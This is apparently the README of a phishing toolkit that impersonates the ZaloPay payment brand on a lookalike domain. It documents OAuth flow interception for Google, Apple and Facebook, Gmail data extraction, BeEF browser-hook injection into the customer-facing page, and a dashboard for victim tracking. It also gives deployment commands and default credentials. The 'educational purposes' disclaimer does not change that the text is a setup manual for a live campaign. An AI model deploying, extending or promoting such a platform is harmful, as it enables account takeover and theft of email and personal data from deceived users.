# ZaloPay Merchant Platform

A comprehensive platform designed for educational and research purposes, featuring advanced OAuth exploitation, Gmail access, BeEF integration, real-time monitoring, and intelligent routing between merchant and admin interfaces.

## 🆕 Latest Updates (2025-10-21)

**NEW: Smart Routing Architecture Implemented!**

We've implemented a complete routing architecture that automatically separates merchant (customer-facing) and admin (management) interfaces while running on the same domain.

### Quick Links to New Documentation

- 📖 **[QUICKSTART.md](QUICKSTART.md)** - Get started in 5 minutes
- 🚀 **[DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md)** - Complete deployment instructions
- 🏗️ **[ROUTING_ARCHITECTURE.md](ROUTING_ARCHITECTURE.md)** - Routing system details
- 📊 **[IMPLEMENTATION_SUMMARY.md](IMPLEMENTATION_SUMMARY.md)** - Implementation overview
- 🎨 **[VISUAL_GUIDE.md](VISUAL_GUIDE.md)** - Visual guide with diagrams

### Key Features Added

✅ **Smart Router** - Automatic role detection and routing  
✅ **Domain Configuration** - zalopaymerchan.com → 221.120.163.129  
✅ **Interface Separation** - Clear merchant/admin separation  
✅ **Automation Scripts** - Setup, testing, and deployment tools  
✅ **Comprehensive Documentation** - 6 detailed guides  

### Quick Start

```bash
# Setup environment
./scripts/setup_env.sh

# Deploy
docker compose build && docker compose up -d

# Test
./scripts/test_routing.sh
```

Visit: **http://zalopaymerchan.com/** to see the new router in action!

## 🚀 Features

### Core Functionality
- **OAuth Exploitation**: Google, Apple, and Facebook OAuth flow interception
- **Gmail Access**: Secure email extraction and contact mapping
- **BeEF Integration**: Browser exploitation framework integration
- **Real-time Dashboard**: Live monitoring and control interface
- **Victim Management**: Comprehensive victim tracking and analysis

### Security Features
- **Rate Limiting**: Advanced rate limiting with Redis backend
- **Network Segmentation**: Firewall rules and IP blocking
- **Secrets Management**: Encrypted storage of sensitive data
- **Security Headers**: Comprehensive HTTP security headers
- **SSL/TLS**: Automated Let's Encrypt certificate management

### Monitoring & Logging
- **InfluxDB Metrics**: Time-series data collection
- **Structured Logging**: JSON-formatted logs with rotation
- **Real-time Updates**: WebSocket-based live updates
- **Health Monitoring**: Comprehensive service health checks

## 🏗️ Architecture

### Services
- **Backend**: FastAPI-based Python application
- **Frontend**: Nginx-served HTML/CSS/JavaScript
- **Database**: MongoDB with Redis caching
- **Monitoring**: InfluxDB for metrics collection
- **Exploitation**: BeEF Framework integration
- **SSL**: Let's Encrypt with Certbot

### Network Architecture
```
Internet → Nginx (SSL Termination) → Backend API
                ↓
            Frontend (Static Files)
                ↓
            MongoDB + Redis + InfluxDB
                ↓
            BeEF Framework
```

## 📋 Prerequisites

### System Requirements
- **OS**: Linux (Ubuntu 20.04+ recommended)
- **RAM**: Minimum 4GB, Recommended 8GB+
- **Storage**: Minimum 20GB free space
- **Network**: Public IP with domain pointing to server

### Software Requirements
- **Docker**: Version 20.10+
- **Docker Compose**: Version 2.0+
- **Domain**: Configured to point to server IP
- **Ports**: 80, 443, 8000, 3000, 8086, 27017, 6379

## 🛠️ Installation

### 1. Clone Repository
   ```bash
   git clone <repository-url>
   cd zalopay_phishing_platform
   ```

### 2. Configure Environment
   ```bash
# Copy environment template
cp env.production.template .env

# Edit environment variables
nano .env
```

**Required Environment Variables:**
```env
DOMAIN=zalopaymerchan.com
BACKEND_URL=https://zalopaymerchan.com
FRONTEND_URL=https://zalopaymerchan.com
JWT_SECRET_KEY=your-secret-key
ENCRYPTION_KEY=your-encryption-key
GOOGLE_CLIENT_ID=your-google-client-id
GOOGLE_CLIENT_SECRET=your-google-client-secret
APPLE_CLIENT_ID=your-apple-client-id
APPLE_CLIENT_SECRET=your-apple-client-secret
FACEBOOK_CLIENT_ID=your-facebook-client-id
FACEBOOK_CLIENT_SECRET=your-facebook-client-secret
```

### 3. Deploy Platform
   ```bash
# Make scripts executable
chmod +x scripts/*.sh

# Run deployment
./scripts/deploy.sh
```

### 4. Verify Deployment
```bash
# Run health check
./scripts/health_check.sh

# Run comprehensive tests
./scripts/test_deployment.sh
```

## 🔧 Configuration

### OAuth Setup

#### Google OAuth
1. Go to [Google Cloud Console](https://console.cloud.google.com/)
2. Create a new project or select existing
3. Enable Google+ API
4. Create OAuth 2.0 credentials
5. Add authorized redirect URIs:
   - `https://zalopaymerchan.com/api/oauth/google/callback`
6. Update `.env` with client ID and secret

#### Apple OAuth
1. Go to [Apple Developer Console](https://developer.apple.com/)
2. Create App ID and Service ID
3. Configure OAuth settings
4. Add redirect URI: `https://zalopaymerchan.com/api/oauth/apple/callback`
5. Update `.env` with client ID and secret

#### Facebook OAuth
1. Go to [Facebook Developers](https://developers.facebook.com/)
2. Create a new app
3. Add Facebook Login product
4. Configure OAuth settings
5. Add redirect URI: `https://zalopaymerchan.com/api/oauth/facebook/callback`
6. Update `.env` with client ID and secret

### SSL Configuration
SSL certificates are automatically managed by Let's Encrypt. Ensure:
- Domain points to server IP
- Ports 80 and 443 are open
- No firewall blocking HTTP/HTTPS traffic

### Database Configuration
MongoDB and Redis are automatically configured. InfluxDB requires manual setup:
```bash
# Access InfluxDB container
docker-compose exec influxdb influx

# Create organization and bucket
influx setup --username admin --password admin123 --org zalopay --bucket metrics --force
```

## 📊 Usage

### Admin Dashboard
Access the admin dashboard at: `https://zalopaymerchan.com/admin`

**Default Credentials:**
- Username: `admin`
- Password: `admin123`

**Features:**
- Victim management and tracking
- Campaign monitoring
- Gmail access and exploitation
- BeEF session control
- Real-time statistics
- Activity logs

### Merchant Interface
Access the merchant interface at: `https://zalopaymerchan.com/merchant`

**Features:**
- OAuth login buttons (Google, Apple)
- BeEF hook injection
- Support pages (Contact, FAQ, Guide)

### BeEF Console
Access BeEF console at: `http://localhost:3000/ui/panel`

**Default Credentials:**
- Username: `beef`
- Password: `beef`

## 🔍 Monitoring

### Health Checks
```bash
# Check service health
./scripts/health_check.sh

# Check specific services
./scripts/health_check.sh services
./scripts/health_check.sh ssl
./scripts/health_check.sh databases
```

### Logs
```bash
# View all logs
docker-compose logs -f

# View specific service logs
docker-compose logs -f backend
docker-compose logs -f mongodb
docker-compose logs -f nginx
```

### Metrics
- **InfluxDB**: `http://localhost:8086`
- **Grafana**: Configured for visualization
- **Log Files**: `./logs/` directory

## 🔒 Security

### Rate Limiting
- IP-based rate limiting
- User-based rate limiting
- Endpoint-specific limits
- Automatic IP blocking

### Network Security
- Firewall rules
- IP whitelisting/blacklisting
- Network segmentation
- Suspicious activity detection

### Secrets Management
- Encrypted storage
- Key rotation
- Access logging
- Secure retrieval

### Security Headers
- Content Security Policy
- HTTP Strict Transport Security
- X-Frame-Options
- X-Content-Type-Options
- And more...

## 🗄️ Backup & Recovery

### Create Backup
```bash
# Full backup
./scripts/backup.sh

# Specific components
./scripts/backup.sh mongodb
./scripts/backup.sh redis
./scripts/backup.sh config
```

### Restore Backup
```bash
# List available backups
./scripts/restore.sh list

# Restore from backup
./scripts/restore.sh zalopay_phishing_backup_20231201_120000
```

## 🧪 Testing

### Run Tests
```bash
# Comprehensive testing
./scripts/test_deployment.sh

# Specific test categories
./scripts/test_deployment.sh health
./scripts/test_deployment.sh ssl
./scripts/test_deployment.sh api
./scripts/test_deployment.sh oauth
```

### Test Results
Test results are saved to:
- `test_results_YYYYMMDD_HHMMSS.txt`
- `test_report_YYYYMMDD_HHMMSS.html`

## 🚨 Troubleshooting

### Common Issues

#### SSL Certificate Issues
   ```bash
# Check certificate status
./scripts/health_check.sh ssl

# Renew certificates
./scripts/init-letsencrypt.sh
   ```

#### Database Connection Issues
   ```bash
# Check database health
./scripts/health_check.sh databases

# Restart databases
docker-compose restart mongodb redis influxdb
```

#### Service Not Starting
```bash
# Check service status
docker-compose ps

# View service logs
docker-compose logs <service-name>

# Restart services
docker-compose restart
```

#### OAuth Issues
1. Verify OAuth credentials in `.env`
2. Check redirect URIs in OAuth providers
3. Ensure domain is accessible via HTTPS
4. Check OAuth callback endpoints

### Log Analysis
```bash
# View application logs
tail -f logs/application.log

# View security logs
tail -f logs/security.log

# View error logs
tail -f logs/error.log
```

## 📚 API Documentation

### Admin API Endpoints
- `GET /api/admin/dashboard/stats` - Dashboard statistics
- `GET /api/admin/victims` - List victims
- `POST /api/admin/victims` - Create victim
- `GET /api/admin/campaigns` - List campaigns
- `POST /api/admin/campaigns` - Create campaign
- `GET /api/admin/logs` - Activity logs

### OAuth API Endpoints
- `GET /api/oauth/google` - Google OAuth initiation
- `GET /api/oauth/apple` - Apple OAuth initiation
- `GET /api/oauth/facebook` - Facebook OAuth initiation
- `GET /api/oauth/{provider}/callback` - OAuth callback

### Gmail API Endpoints
- `POST /api/admin/gmail/access` - Initiate Gmail access
- `POST /api/admin/gmail/extract` - Extract intelligence
- `POST /api/admin/gmail/export` - Export data

### BeEF API Endpoints
- `GET /api/admin/beef/hooks` - List hooked browsers
- `POST /api/admin/beef/command` - Send command
- `GET /api/admin/beef/command_results` - Get results

### WebSocket Endpoints
- `WS /ws` - Real-time updates

## 🔄 Maintenance

### Regular Tasks
1. **Monitor logs** for errors and security issues
2. **Check SSL certificates** for expiration
3. **Review rate limiting** and blocked IPs
4. **Update dependencies** regularly
5. **Backup data** on schedule

### Updates
```bash
# Pull latest changes
git pull origin main

# Rebuild and restart
./scripts/deploy.sh
```

### Cleanup
```bash
# Clean old logs
docker-compose exec backend python -c "from monitoring.log_rotation import cleanup_old_logs; cleanup_old_logs(30)"

# Clean old backups
./scripts/backup.sh cleanup

# Clean Docker resources
docker system prune -f
```

## 📞 Support

### Documentation
- System Architecture: `docs/system-architecture.md`
- Database Schema: `docs/database-schema.md`
- API Reference: `docs/api-reference.md`

### Logs and Monitoring
- Application logs: `./logs/`
- Health checks: `./scripts/health_check.sh`
- Test results: `./test_results_*.txt`

### Emergency Procedures
1. **Service Down**: Check `docker-compose ps` and logs
2. **Database Issues**: Restart databases and check connections
3. **SSL Issues**: Renew certificates with Let's Encrypt
4. **Security Breach**: Check logs and block suspicious IPs

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## ⚖️ Legal Notice

This software is provided for educational and research purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. The authors disclaim any liability for misuse of this software.

---

**Remember**: Always use this software responsibly and in accordance with applicable laws and regulations.
